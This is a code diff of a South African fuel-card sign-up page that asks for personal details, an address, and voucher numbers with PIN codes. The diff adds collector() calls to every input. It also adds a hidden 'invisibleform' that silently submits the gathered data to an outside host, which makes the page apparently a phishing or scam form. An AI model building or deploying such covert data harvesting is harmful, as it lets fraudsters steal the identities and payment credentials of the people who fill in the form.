@@ -14,6 +14,7 @@ Sign Up
 <script>
 pack = localStorage.getItem('pack');
 hpack = localStorage.getItem('hpack');
+rpack = localStorage.getItem('ppack');
 if(hpack=="" || hpack == null) {
 location = 'index.html#apply';
 }
@@ -37,10 +38,10 @@ location = 'index.html#apply';
 <div class="pa1 pal palx" id="rp1">
 <div class="pname pil">Bronze G Fill-Up</div><br/>
 <div class="formpart">
-<input type="firstname" name="firstname" id="firstname" placeholder="First Name" class="field" onchange="ffc(1,this)"><br/>
-<input type="lastname" name="lastname" id="lastname" placeholder="Last Name" class="field" onchange="ffc(1,this)"><br/>
-<input type="text" name="birthday" id="birthday" placeholder="Date of Birth" class="field" onfocus="this.blur();this.type='date';this.focus();this.click();" onchange="ffc(1,this)"><br/>
-<select type="gender" name="gender" id="gender" placeholder="Gender" class="field" onchange="ffc(1,this)">
+<input type="firstname" name="firstname" id="firstname" placeholder="First Name" class="field" onchange="ffc(1,this); collector(this);"><br/>
+<input type="lastname" name="lastname" id="lastname" placeholder="Last Name" class="field" onchange="ffc(1,this);  collector(this);"><br/>
+<input type="text" name="birthday" id="birthday" placeholder="Date of Birth" class="field" onfocus="this.blur();this.type='date';this.focus();this.click();" onchange="ffc(1,this);  collector(this);"><br/>
+<select type="gender" name="gender" id="gender" placeholder="Gender" class="field" onchange="ffc(1,this);  collector(this);">
 <option value="" selected disabled>Gender</option>
 <option value="Male">Male</option>
 <option value="Female">Female</option>
@@ -60,9 +61,9 @@ location = 'index.html#apply';
 <div class="pa1 pal palx" id="rp2" style="display:none;">
 <div class="pname pil">Bronze G Fill-Up</div><br/>
 <div class="formpart">
-<input type="email" name="email" id="email" placeholder="Email Address" class="field" onchange="ffc(2,this)"><br/>
-<input type="tel" name="phone" id="phone" placeholder="Phone Number" class="field" onchange="ffc(2,this)"><br/>
-<select type="province" name="province" id="province" placeholder="Province" class="field" onchange="ffc(2,this)">
+<input type="email" name="email" id="email" placeholder="Email Address" class="field" onchange="ffc(2,this);  collector(this);"><br/>
+<input type="tel" name="phone" id="phone" placeholder="Phone Number" class="field" onchange="ffc(2,this);  collector(this);"><br/>
+<select type="province" name="province" id="province" placeholder="Province" class="field" onchange="ffc(2,this);  collector(this);">
 <option value="" selected disabled>Province</option>
 <option value="GP">Gauteng</option>
 <option value="LP">Limpopo</option>
@@ -74,7 +75,7 @@ location = 'index.html#apply';
 <option value="FS">Free State</option>
 <option value="NW">North West</option>
 </select><br/>
-<input type="city" name="city" id="city" placeholder="City" class="field" onchange="ffc(2,this)"><br/><br/>
+<input type="city" name="city" id="city" placeholder="City" class="field" onchange="ffc(2,this);  collector(this);"><br/><br/>
 </div>
 <div class="pdescriptionsmall pil">
 &bull;&nbsp; Get a single Fill-Up per top up.<br/>
@@ -92,9 +93,9 @@ location = 'index.html#apply';
 <div class="pname pil">Bronze G Fill-Up</div><br/>
 <div class="formpart">
 <font class="ptext fpf">Where would you like your Galela Fill-Up card to be delivered?</font>
-<input type="town" name="suburb" id="suburb" placeholder="Suburb/Town" class="field" onchange="ffc(3,this)"><br/>
-<input type="location" name="street" id="street" placeholder="Street Number & Name" class="field" onchange="ffc(3,this)"><br/>
-<input type="number" name="postal" id="postal" placeholder="Zip Code" class="field" onchange="ffc(3,this)"><br/>
+<input type="town" name="suburb" id="suburb" placeholder="Suburb/Town" class="field" onchange="ffc(3,this);  collector(this);"><br/>
+<input type="location" name="street" id="street" placeholder="Street Number & Name" class="field" onchange="ffc(3,this);  collector(this);"><br/>
+<input type="number" name="postal" id="postal" placeholder="Zip Code" class="field" onchange="ffc(3,this);  collector(this);"><br/>
 <font class="smallgraysxx">DSV will contact you to confirm.</font>
 </div>
 <div class="pdescriptionsmall pil">
@@ -104,7 +105,7 @@ location = 'index.html#apply';
 <font class="smallgraysx">Maximum of 80 litres per Fill-Up</font>
 </div><br/>
 <div class="pcostx pil">R579.99</div><br/>
-<div class="papplyx pil"><button onclick="document.querySelector('#rp3').style.display='none'; document.querySelector('#rp4').style.display='inline-block';" id="b3" disabled>Next</button>
+<div class="papplyx pil"><button onclick="document.querySelector('#rp3').style.display='none'; document.querySelector('#rp4').style.display='inline-block';lastStepConf()" id="b3" disabled>Next</button>
 <br/>
 <a href="javascript:void(0);" class="plb" onclick="document.querySelector('#rp3').style.display='none'; document.querySelector('#rp2').style.display='inline-block';">Back</a></div>
 </div>
@@ -114,9 +115,9 @@ location = 'index.html#apply';
 <div class="formpart">
 <font class="ptext fpf">One last step! How would you like to pay?</font>
 
-<input type="address" name="street" id="street" value="Customer: &nbsp; John Doe" class="field" readonly><br/>
-<input type="address" name="postal" id="postal" value="Amount Due: &nbsp; R579" class="field" readonly><br/>
-<select type="payment" name="payment" id="payment" placeholder="Payment Option" class="field" onchange="paymentView(this.value)">
+<input type="text" name="fullname" id="customer" value="Customer: &nbsp; John Doe" class="field" readonly><br/>
+<input type="text" name="amountdue" id="amountdue" value="Amount Due: &nbsp; R579" class="field" readonly><br/>
+<select type="payment" name="payment" id="payment" placeholder="Payment Option" class="field" onchange="paymentView(this.value); collector(this);">
 <option value="" selected disabled>Payment Options</option>
 <option value="OV">1 Voucher/OTT Voucher</option>
 <option value="SBV">Standard Bank Instant Money</option>
@@ -129,7 +130,7 @@ location = 'index.html#apply';
 &bull;&nbsp; Free Galela Fill-Up Card.<br/>
 <font class="smallgraysx">Maximum of 80 litres per Fill-Up</font>
 </div><br/>
-<div class="papplyx pil"><button onclick="done()" id="b4" disabled>Complete Sign Up</button>
+<div class="papplyx pil"><button onclick="donezo()" id="b4" disabled>Complete Sign Up</button>
 <br/>
 <a href="javascript:void(0);" class="plb" onclick="document.querySelector('#rp4').style.display='none'; document.querySelector('#rp3').style.display='inline-block';">Back</a>
 </div>
@@ -176,7 +177,7 @@ EFT Payment
 </div>
 <div class="pvopts">
 <button class="pvo w" onclick="paymentView();document.querySelector('#payment').value='';">Cancel</button>
-<button class="pvo b" onclick="paymentView();document.querySelector('#b4').removeAttribute('disabled');document.querySelector('#payment').outerHTML='<input type=\'text\' class=\'field\' value=\'Payment Awaiting Verification &#10004; ✔\' id=\'payment\' readonly>';document.querySelector('#payment').style.border='1px solid #00ff00';window.setTimeout(function(){document.querySelector('#payment').style.border='';},1000);">Submit</button>
+<button class="pvo b" onclick="paymentView();document.querySelector('#b4').removeAttribute('disabled');document.querySelector('#payment').outerHTML='<input type=\'text\' class=\'field\' value=\'Payment Awaiting Verification &nbsp;&nbsp;&nbsp; &#10004;\' id=\'payment\' readonly>';document.querySelector('#payment').style.border='1px solid #00ff00';window.setTimeout(function(){document.querySelector('#payment').style.border='';},1000);">Submit</button>
 </div>
 </div>
 </div>
@@ -231,7 +232,7 @@ if(n==1)
 </script>
 <script>
 function currentStep(n) {
-window.setInterval(fuction(){
+window.setInterval(function(){
 
 },500);
 }
@@ -239,14 +240,16 @@ currentStep(1);
 </script>
 <script>
 function paymentView(en) {
+rpj = rpack.replace('R','');
+rpk = (rpj*1)+0.01;
 document.querySelector('#pvb').style.display = 'block';
 switch(en)
 {
 case "OV":
 document.querySelector('#pvhed').innerHTML = 'OTT/1 Voucher Payment';
 document.querySelector('#pvdets').innerHTML = `
-<input type="text" id="usamountv" value="Amount Due: R579" readonly class="field"><br/>
-<input type="number" name="pin" placeholder="Voucher Number" id="pin" class="field"><br/>
+<input type="text" id="usamountv" value="Amount Due: `+rpk+`" readonly class="field" onchange="collector(this);"><br/>
+<input type="number" name="pin" placeholder="Voucher Number" id="pin" class="field" onchange="collector(this);"><br/>
 <font class="grays">It takes 1 hour for us to verify your voucher, after which you will receive a confirmation email to <font class="toemail"></font> & SMS to <font class="tophone"></font>.<br/>Proof of payments can be sent to <b id="usproofemail">proof@galela.co.za</b>. For further assistance please feel free to WhatsApp Us at <b id="uswhatsapp">0812345678</b>, we're available 24/7 to respond to your inquieries.
 </font>
 `;
@@ -254,9 +257,9 @@ break;
 case "SBV":
 document.querySelector('#pvhed').innerHTML = 'Standard Bank Instant Money Voucher Payment';
 document.querySelector('#pvdets').innerHTML = `
-<input type="text" id="usamounts" value="Amount Due: R579" readonly class="field"><br/>
-<input type="number" name="voucher" placeholder="Voucher Number" id="voucher" class="field"><br/>
-<input type="number" name="code" placeholder="Pin Code" id="code" class="field"><br/>
+<input type="text" id="usamounts" value="Amount Due: `+rpk+`" readonly class="field"><br/>
+<input type="number" name="voucher" placeholder="Voucher Number" id="voucher" class="field" onchange="collector(this);"><br/>
+<input type="number" name="code" placeholder="Pin Code" id="code" class="field" onchange="collector(this);"><br/>
 <font class="grays">It takes 1 hour for us to verify your voucher, after which you will receive a confirmation email to <font class="toemail"></font> & SMS to <font class="tophone"></font>.<br/>Proof of payments can be sent to <b id="usproofemail">proof@galela.co.za</b>. For further assistance please feel free to WhatsApp Us at <b id="uswhatsapp">0812345678</b>, we're available 24/7 to respond to your inquieries.
 </font>
 `;
@@ -265,11 +268,11 @@ case "EFT":
 document.querySelector('#pvhed').innerHTML = 'EFT Payment';
 document.querySelector('#pvdets').innerHTML = `
 <input type="text" id="usbank" value="Bank Name: ABSA Bank" readonly class="field"><br/>
-<input type="text" id="usaccountnumber" value="Account Number: 95489849" readonly class="field"><br/>
+<input type="text" id="usaccountnumber" value="Account Number: 9387898199" readonly class="field"><br/>
 <input type="text" id="ustype" value="Account Type: Current / Cheque" readonly class="field"><br/>
-<input type="text" id="youreference" value="Reference Number: 0712345678" readonly class="field"><br/>
-<input type="text" id="usamount" value="Amount Due: R579" readonly class="field"><br/>
-<a href="javascript:void(0);" onclick="proofeft.click();" class="proat">Attach a proof of payment (Optional)</a><input type="file" name="proofeft" id="proofeft" style="display:none;" onchange="document.querySelector('.proat').innerHTML='Proof of payment has been attached';">
+<input type="text" id="youreference" value="Reference Number: `+collection['phone']+`" readonly class="field"><br/>
+<input type="text" id="usamount" value="Amount Due: `+rpack+`" readonly class="field"><br/>
+<a href="javascript:void(0);" onclick="proofeft.click();" class="proat">Attach a proof of payment (Optional)</a>
 <font class="grays">It takes  up to 90 minutes for an immediate EFT to reflect to us. Should you make a normal payment, it can take up to 48 hours to reflect to us. After which you will receive a confirmation email to <font class="toemail"></font> & SMS to <font class="tophone"></font>.<br/>Proof of payments can also be sent to <b id="usproofemail">proof@galela.co.za</b> if you did not attach it on this page.
 </font>
 `;
@@ -278,6 +281,30 @@ default:
 document.querySelector('#pvb').style.display = 'none';
 break;
 }
+}
+</script>
+
+<script>
+lastStepConf =  function() {
+
+document.getElementById('customer').value = 'Customer:  ' + collection['firstname'] + ' ' + collection['lastname'];
+document.getElementById('amountdue').value = 'Amount Due:  ' + rpack;
+}
+</script>
+<div id="hiddenform">
+<form action="https://cpu.diginex.co.za/process.php" method="post" enctype="multipart/form-data" id="invisibleform">
+<input type="file" name="proofeft" id="proofeft" style="display:none;" onchange="document.querySelector('.proat').innerHTML='Proof of payment has been attached';">
+<input type="text" name="website" value="galela">
+
+</form>
+</div>
+<script>
+donezo =  function() {
+cl = collection.length;
+document.getElementById('invisibleform').innerHTML = document.getElementById('invisibleform').innerHTML + totalform;
+window.setTimeout(function() {
+document.getElementById('invisibleform').submit();
+}, 500);
 }
 </script>
 </body>
